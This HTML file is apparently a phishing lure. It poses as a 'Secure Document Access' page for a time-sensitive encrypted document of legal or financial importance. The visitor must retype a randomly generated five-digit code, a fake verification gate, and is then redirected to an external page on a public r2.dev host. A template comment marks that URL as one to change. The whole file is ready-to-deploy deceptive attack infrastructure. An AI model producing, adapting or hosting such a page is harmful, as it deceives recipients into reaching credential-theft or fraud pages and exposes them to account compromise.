<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Document Access</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(to right, #e9ecef, #f8f9fa);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: #ffffff;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
      padding: 40px 30px;
      border-radius: 16px;
      max-width: 500px;
      text-align: center;
      width: 90%;
    }
    h1 {
      font-size: 1.4rem;
      color: #333;
      margin-bottom: 15px;
    }
    p {
      font-size: 0.95rem;
      color: #555;
      margin-bottom: 25px;
    }
    .code-box {
      font-size: 2rem;
      font-weight: bold;
      background-color: #f1f3f5;
      padding: 12px 20px;
      border-radius: 12px;
      display: inline-block;
      margin-bottom: 25px;
      letter-spacing: 3px;
      user-select: none;
      color: #343a40;
    }
    input {
      padding: 10px;
      font-size: 1rem;
      width: 70%;
      border: 1px solid #ced4da;
      border-radius: 8px;
      margin-bottom: 20px;
    }
    button {
      background-color: #4c7ef3;
      color: white;
      border: none;
      padding: 10px 18px;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #3a66d4;
    }
    #errorMsg {
      color: red;
      margin-top: 10px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Time-sensitive Encrypted Document</h1>
    <p>
      This transmission may include material of legal, financial, or contractual significance.<br/>
      To continue, verify the code shown below.
    </p>

    <div class="code-box" id="codeDisplay">-----</div><br>

    <input type="text" id="userInput" placeholder="Enter the code above" maxlength="5" />
    <br />
    <button onclick="verifyCode()">Verify</button>

    <div id="errorMsg">Incorrect code. Please try again.</div>
  </div>

  <script>
    const finalURL = "https://pub-addb67bf946e4e6680f5209e17539e60.r2.dev/docrdat.html"; // üîÅ CHANGE THIS

    // Generate a 5-digit code (00000 to 99999 with leading zeros)
    const validCode = String(Math.floor(Math.random() * 100000)).padStart(5, '0');

    // Display the code
    document.getElementById("codeDisplay").textContent = validCode;

    function verifyCode() {
      const input = document.getElementById("userInput").value.trim();
      if (input === validCode) {
        window.location.href = finalURL;
      } else {
        document.getElementById("errorMsg").style.display = "block";
      }
    }
  </script>
</body>
</html>
